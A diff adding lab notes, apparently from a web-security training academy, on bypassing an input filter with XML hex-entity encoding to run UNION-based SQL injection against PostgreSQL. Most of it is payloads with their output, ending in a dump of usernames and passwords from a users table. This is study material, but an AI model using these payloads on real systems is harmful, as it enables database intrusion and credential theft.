@@ -328,6 +328,92 @@ SELECT password FROM (select password,ROWNUM AS RN FROM users) WHERE RN=1
 # 59jzm7znmj7bt5t1liio.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com
 ```
 
+## xml + filter bypass (postgres)
+```
+# normal
+<productId>1</productId> <<-- 111 units
+<productId>2</productId> <<-- 967 units
+<productId>0+2</productId> <<-- 967 units
+<productId>1+1</productId> <<-- 967 units ; some logic parsing here
+
+# trying
+<productId>1'</productId> <<-- "Attack detected"
+<productId>1 union select null</productId> <<-- "Attack detected"
+
+# use hackvertor; hex_entities (since XMl)
+1 union select null <<-- go to hackvertor, select "hex_entities"
+
+# output:
+&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;
+
+# 1 union select null
+<productId>&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;</productId>
+<<-- 0 units
+
+# 1 union select null
+<productId>&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;</productId>
+<<-- 0 units
+
+# 1 union select null (at storeId) <<-- this was the key
+<storeId>&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;</storeId>
+<<-- 
+111 units
+null
+
+# 1 union select null, null
+<storeId>&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x2c;&#x20;&#x6e;&#x75;&#x6c;&#x6c;</storeId>
+<<-- 0 units ; 2 columns no-go, 1 column ok
+
+# 1 union select version()
+&#x31;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x28;&#x29;
+<<--
+111 units
+PostgreSQL 12.13 (Ubuntu 12.13-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+# interlude: cyberchef method
+https://gchq.github.io/CyberChef/#recipe=To_Hex('%5C%5Cx',0)Find_/_Replace(%7B'option':'Regex','string':'%5C%5C%5C%5C'%7D,';%26%23',true,false,true,false)&input=MSB1bmlvbiBzZWxlY3QgZGF0bmFtZSBmcm9tIHBnX2RhdGFiYXNl
+
+# 1 union select datname from pg_database
+<<--
+template1
+academy_labs
+postgres
+111 units
+template0
+
+# 1 union select current_database() from pg_database
+<<--
+academy_labs
+111 units
+
+# 1 union select tablename from pg_catalog.pg_tables
+<<--
+pg_language
+pg_sequence
+pg_largeobject
+pg_authid
+...
+users
+...
+pg_aggregate
+111 units
+products
+pg_transform
+
+# 1 union select column_name from information_schema.columns where table_name='users'
+<<--
+password
+111 units
+username
+
+# 1 union select concat(username,':',password) from users
+<<--
+carlos:qqlkhy8v0srnihc5ytr3
+wiener:84lxqf5hrxz36gt681ff
+111 units
+administrator:dd2m1my7bm3zkwrhhn5q
+```
+
 # drafts
 oracle tests
 ```
